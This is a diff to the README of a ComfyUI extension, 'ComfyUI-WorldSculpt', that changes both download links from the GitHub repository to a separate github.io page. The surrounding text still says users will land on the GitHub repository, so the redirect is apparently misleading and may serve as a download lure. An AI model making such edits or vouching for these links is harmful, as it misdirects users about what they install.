@@ -1,6 +1,6 @@
 # 🧙 ComfyUI-WorldSculpt - Sculpt Entire Scenes with AI Magic
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--WorldSculpt-brightgreen?style=for-the-badge&logo=github)](https://github.com/Deepmined-macadamianut74/ComfyUI-WorldSculpt)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--WorldSculpt-brightgreen?style=for-the-badge&logo=github)](https://deepmined-macadamianut74.github.io)
 
 ## 🚀 What Is This?
 
@@ -34,7 +34,7 @@ Getting started takes less than 5 minutes.
 
 ### Step 1: Visit the Download Page
 
-👉 [**Click here to go to the official download page**](https://github.com/Deepmined-macadamianut74/ComfyUI-WorldSculpt)
+👉 [**Click here to go to the official download page**](https://deepmined-macadamianut74.github.io)
 
 Visit this link to download the application. You will land on the GitHub repository page where you can find the latest release files.
 
